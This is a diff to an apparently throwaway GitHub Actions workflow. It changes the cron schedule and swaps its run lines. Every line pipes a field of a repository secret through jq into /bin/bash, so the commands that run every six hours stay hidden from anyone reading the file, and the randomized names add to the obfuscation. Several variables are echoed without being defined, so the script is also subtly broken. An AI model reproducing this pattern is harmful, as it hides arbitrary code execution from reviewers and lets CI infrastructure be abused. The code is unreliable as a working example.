@@ -1,10 +1,8 @@
 name: heqizheng6789
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 2/6 * * *'
-
+    - cron: '19 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,18 +10,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: heqizheng6789
         env:
-          kgf032: ${{ secrets.kgf032 }}
+          dq8068: ${{ secrets.dq8068 }}
         run: |
-          echo $kgf032 | jq -r .jn69 | /bin/bash
-          echo $g07 | jq -r .zh2781 | /bin/bash
-          echo $wlgpo0 | jq -r .oimko3238 | /bin/bash
-          echo $abgu4111 | jq -r .p13038 | /bin/bash
-          echo $pfqn4873 | jq -r .vnmo507 | /bin/bash
-          echo $cdy86166 | jq -r .irar21191 | /bin/bash
-          echo $lzacy4 | jq -r .dcs7485 | /bin/bash
-          echo $w5251 | jq -r .oz72843 | /bin/bash
-          echo $f1579 | jq -r .hywbz02 | /bin/bash
-          echo $dz8252 | jq -r .qc88 | /bin/bash
-          echo $qze033 | jq -r .uqp7927 | /bin/bash
-          echo $xmp6 | jq -r .db3106 | /bin/bash
+          echo $dq8068 | jq -r .qx2557 | /bin/bash
+          echo $pszcw49 | jq -r .lx98 | /bin/bash
+          echo $zq9 | jq -r .mv6 | /bin/bash
+          echo $pf70771 | jq -r .pwah4447 | /bin/bash
 
